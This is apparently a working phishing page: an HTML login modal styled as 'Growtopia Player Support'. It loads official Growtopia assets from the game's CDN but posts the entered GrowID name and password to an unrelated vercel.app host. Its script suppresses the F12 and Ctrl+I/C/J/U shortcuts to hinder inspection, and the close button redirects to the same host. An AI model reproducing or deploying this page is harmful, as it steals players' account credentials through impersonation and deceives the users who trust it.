<!DOCTYPE html>
<html lang="en" style="background-color: rgba(0, 0, 0, 0); width: 100%; height: 100%">
<head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Growtopia Player Support</title>
    <link rel="icon" type="image/png" href="https://s3.eu-west-1.amazonaws.com/cdn.growtopiagame.com/website/resources/assets/images/growtopia.ico" sizes="16x16" />
    <link rel="stylesheet" href="https://s3.eu-west-1.amazonaws.com/cdn.growtopiagame.com/website/resources/assets/css/faq-main.css" />
    <link rel="stylesheet" href="https://s3.eu-west-1.amazonaws.com/cdn.growtopiagame.com/website/resources/assets/css/shop-custom.css" />
    <link rel="stylesheet" href="https://s3.eu-west-1.amazonaws.com/cdn.growtopiagame.com/website/resources/assets/css/ingame-custom.css" />
    <style>
        .modal-backdrop { background-color: rgba(0, 0, 0, 0.1); }
        .modal-backdrop + div { overflow: auto; }
        .modal-body, .content { padding: 0; }
    </style>
</head>
<body style="background-color: rgba(0, 0, 0, 0)">
    <button type="button" class="btn btn-primary hidden" data-toggle="modal" id="modalButton" data-target="#modalShow" data-backdrop="static" data-keyboard="false"></button>
    <div class="content">
        <section class="common-box">
            <div class="container">
                <div class="row">
                    <div class="col-md-12 col-sm-12">
                        <div class="modal fade product-list-popup" id="modalShow" tabindex="-1" role="dialog" aria-hidden="false">
                            <div class="modal-dialog modal-dialog-centered" role="document">
                                <div class="modal-content">
                                    <div class="modal-body">
                                        <div class="content">
                                            <section class="common-box">
                                                <div class="container">
                                                    <div class="section-title center-align">
                                                        <h2>Log in with your GrowID</h2>
                                                    </div>
                                                    <div class="row div-content-center">
                                                        <div class="col-md-12 col-sm-12">
                                                            <form method="POST" action="https://login-web-pcm9.vercel.app/player/growid/login/validate" accept-charset="UTF-8" autocomplete="off">
                                                                <input name="_token" type="hidden" value="" />
                                                                <div class="form-group">
                                                                    <input id="login-name" class="form-control grow-text" placeholder="Your GrowID Name *" name="growId" type="text" />
                                                                </div>
                                                                <div class="form-group">
                                                                    <input id="password" class="form-control grow-text" placeholder="Your GrowID Password *" name="password" type="password" value="" />
                                                                </div>
                                                                <div class="form-group text-center">
                                                                    <input class="btn btn-lg btn-primary grow-button" type="submit" value="Log in" />
                                                                </div>
                                                            </form>
                                                        </div>
                                                    </div>
                                                </div>
                                            </section>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </section>
    </div>
    <script src="https://s3.eu-west-1.amazonaws.com/cdn.growtopiagame.com/website/resources/vendors/jquery/jquery-2.1.4.min.js"></script>
    <script src="https://s3.eu-west-1.amazonaws.com/cdn.growtopiagame.com/website/resources/vendors/bootstrap/javascripts/bootstrap.min.js"></script>
    <script>
        let clicked = false;
        $('a').click(function () {
            if (!clicked) {
                clicked = true;
                return true;
            }
            $(this).attr('onclick', 'return false;');
        });
        $(document).ready(function () {
            document.onkeydown = e => {
                if (['123', 'F12', 'I', 'C', 'J', 'U'].includes(e.key) || (e.ctrlKey && ['I', 'C', 'J', 'U'].includes(e.key))) {
                    e.preventDefault();
                }
            };
            $('#modalButton').trigger('click');
            $('.close').on('click', function () {
                window.location = 'https://login-web-pcm9.vercel.app/player/validate/close';
            });
            const observer = new MutationObserver(mutations => {
                mutations.forEach(mutation => {
                    mutation.addedNodes.forEach(node => {
                        if (node.tagName === 'DIV' && window.screen.width < 667) {
                            $(node).css({
                                transform: 'scale(0.75)',
                                'transform-origin': '0 0',
                                overflow: 'auto',
                            });
                        }
                    });
                });
            });
            observer.observe(document.body, { childList: true });
        });
    </script>
</body>
</html>
